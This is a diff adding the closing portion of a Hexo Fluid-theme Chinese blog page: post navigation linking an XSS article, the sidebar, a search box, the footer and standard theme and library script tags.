+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">苏州之行</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/27/XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89/" title="XSS（跨站脚本攻击）">
+                        <span class="hidden-mobile">XSS（跨站脚本攻击）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
